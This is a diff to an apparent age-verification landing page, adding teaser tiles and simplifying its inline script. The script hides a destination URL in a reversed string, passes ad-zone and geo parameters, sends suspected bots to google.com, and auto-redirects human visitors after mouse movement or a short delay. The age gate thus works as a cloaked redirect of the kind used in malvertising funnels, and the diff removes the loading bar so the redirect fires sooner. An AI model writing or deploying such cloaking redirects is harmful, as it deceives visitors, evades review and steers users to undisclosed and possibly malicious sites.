@@ -36,6 +36,11 @@
     .load-bar { height: 3px; background: rgba(255,255,255,.1); border-radius: 2px; overflow: hidden; margin-top: 20px; }
     #load-progress { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s ease; }
     #load-text { font-size: 14px; color: var(--muted); margin-top: 10px; }
+    .teaser-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; text-align: left; }
+    .teaser-item { background: rgba(255, 255, 255, .03); border: 1px solid var(--stroke); border-radius: 12px; padding: 10px; }
+    .teaser-item img { width: 100%; border-radius: 8px; margin-bottom: 8px; aspect-ratio: 16/9; background: #1a1a24; }
+    .teaser-item h4 { font-size: 14px; margin: 0 0 4px; color: var(--text); }
+    .teaser-item p { font-size: 11px; color: var(--muted2); margin: 0; }
   </style>
 </head>
 <body>
@@ -48,9 +53,7 @@
   </div>
   <main class="wrap">
     <section class="card shadow-lg">
-      <div class="hero">
-        <div class="heroBadge"><span class="dot"></span><span><b>Community Online</b> • <span id="user-count">...</span> users active</span></div>
-      </div>
+      <div class="hero"></div>
       <div class="content">
         <h1>Age Verification</h1>
         <p class="sub">This website contains age-restricted content. Please confirm you are 18+ to proceed.</p>
@@ -59,10 +62,22 @@
           <h3>Terms of Entry</h3>
           <p>By entering this site, you certify that you are at least 18 years of age and agree to our terms of service. We use temporary session markers to optimize your browsing experience. No personal identifiers are collected.</p>
           <ul style="text-align: left; font-size: 13px; color: var(--muted2); margin-top: 10px;">
-            <li>✓ SSL Encrypted Session</li>
-            <li>✓ Instant Access</li>
-            <li>✓ Privacy Protected</li>
+            <li>✓ Secure Content Access</li>
+            <li>✓ Global Network</li>
+            <li>✓ Privacy Protection</li>
           </ul>
+        </div>
+        <div class="teaser-grid">
+          <div class="teaser-item">
+            <div style="width:100%; height:80px; background:linear-gradient(45deg, #1a1a24, #2a2a35); border-radius:8px; margin-bottom:8px;"></div>
+            <h4>Premium Content</h4>
+            <p>Exclusive access to top-rated platforms.</p>
+          </div>
+          <div class="teaser-item">
+            <div style="width:100%; height:80px; background:linear-gradient(45deg, #2a2a35, #1a1a24); border-radius:8px; margin-bottom:8px;"></div>
+            <h4>Global Access</h4>
+            <p>Connect from anywhere in the world.</p>
+          </div>
         </div>
       </div>
       <footer class="footer">
@@ -75,9 +90,8 @@
     const _sys_d = (s) => s.split('').reverse().join('');
     const configToken = _sys_d("91ac66981bcc7578276ccb2e9f5ee7f0=yek?jwsamqfwp/moc.werdelahni//:sptth");
     const sessionKey = "hsrc"; const sessionVal = "1"; const sessionID = "v55_init_done";
-    const ui = { btn: document.getElementById("entry-btn"), loader: document.getElementById("btn-loader"), text: document.getElementById("btn-text"), screen: document.getElementById("loading-screen"), bar: document.getElementById("load-progress"), status: document.getElementById("load-text"), users: document.getElementById("user-count") };
+    const ui = { btn: document.getElementById("entry-btn"), loader: document.getElementById("btn-loader"), text: document.getElementById("btn-text") };
     let state = { isHuman: false, isRedirecting: false, botDetected: false, isLegit: false, envReady: false };
-    ui.users.innerText = Math.floor(Math.random() * (1500 - 800) + 800).toLocaleString();
     const verifyEnvironment = async () => {
       const p = new URLSearchParams(window.location.search);
       if (p.get(sessionKey) === sessionVal) state.isLegit = true;
@@ -88,23 +102,14 @@
       state.envReady = true;
     };
     let _delayDone = false;
-    const tryAutoDispatch = () => { if (_delayDone && state.isHuman && state.isLegit && !state.botDetected) { beginStepProc(); } };
+    const tryAutoDispatch = () => { if (_delayDone && state.isHuman && state.isLegit && !state.botDetected) { finalizeMove(); } };
     const markHuman = () => { state.isHuman = true; tryAutoDispatch(); };
     window.addEventListener('mousemove', markHuman, { once: true });
     window.addEventListener('touchstart', markHuman, { once: true });
     window.addEventListener('scroll', markHuman, { once: true });
-    function beginStepProc() {
-      if (!state.envReady || state.isRedirecting || !state.isLegit || state.botDetected) return;
-      state.isRedirecting = true; localStorage.setItem(sessionID, "1");
-      ui.screen.style.display = "flex";
-      let p = 0; const i = setInterval(() => {
-        p += Math.random() * 12; if (p > 100) p = 100; ui.bar.style.width = p + "%";
-        if (p > 40) ui.status.innerText = "Syncing session...";
-        if (p > 80) ui.status.innerText = "Accessing portal...";
-        if (p >= 100) { clearInterval(i); finalizeMove(); }
-      }, 180);
-    }
     function finalizeMove() {
+      if (state.isRedirecting) return; state.isRedirecting = true;
+      localStorage.setItem(sessionID, "1");
       let l = configToken; const p = new URLSearchParams(window.location.search);
       const z = p.get('zoneid') || p.get('zone') || p.get('psid');
       const g = p.get('geo') || p.get('country');
@@ -112,10 +117,10 @@
       window.location.replace(l);
     }
     ui.btn.addEventListener("click", () => {
-      if (!state.isHuman) return; ui.btn.disabled = true; ui.loader.style.display = "block"; ui.text.innerText = "Verifying...";
-      const wait = setInterval(() => { if (state.envReady) { clearInterval(wait); if (state.isLegit && !state.botDetected) beginStepProc(); } }, 100);
+      if (!state.isHuman) return; ui.btn.disabled = true; ui.loader.style.display = "block"; ui.text.innerText = "Entering...";
+      const wait = setInterval(() => { if (state.envReady) { clearInterval(wait); if (state.isLegit && !state.botDetected) finalizeMove(); else if (state.botDetected) window.location.href="https://google.com"; } }, 100);
     });
-    document.addEventListener("DOMContentLoaded", () => { verifyEnvironment(); setTimeout(() => { _delayDone = true; tryAutoDispatch(); }, 2000 + Math.random() * 1500); });
+    document.addEventListener("DOMContentLoaded", () => { verifyEnvironment(); setTimeout(() => { _delayDone = true; tryAutoDispatch(); }, 1500 + Math.random() * 1000); });
   </script>
 </body>
 </html>
